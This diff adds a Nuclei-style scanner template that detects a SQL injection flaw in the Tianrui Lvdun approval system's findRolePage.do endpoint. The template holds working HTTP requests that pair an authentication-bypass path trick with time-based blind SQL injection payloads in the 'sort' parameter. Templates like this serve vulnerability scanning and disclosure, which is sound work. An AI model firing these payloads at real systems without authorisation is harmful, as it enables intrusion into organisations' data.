@@ -1,0 +1,40 @@
+id: tianrui-findRolePage-sqli
+
+info:
+  name: 天锐绿盾审批系统 findRolePage.do SQL注入漏洞
+  author: tianrui
+  severity: high
+  tags: tianrui
+
+http:
+  - raw:
+      - |
+        POST /trwfe/login.jsp/.%2e/role/findRolePage.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        sort=id+OR+(SELECT+5244+FROM+(SELECT(SLEEP(2)))HAjH)&order=asc
+
+      - |
+        POST /trwfe/login.jsp/.%2e/role/findRolePage.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        sort=id+OR+(SELECT+5244+FROM+(SELECT(SLEEP(4)))HAjH)&order=asc
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1 >= 2'
+          - 'duration_2 >= 4'
+          - 'duration_1 < 4'
+          - 'duration_2 < 6'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - '"total"'
+
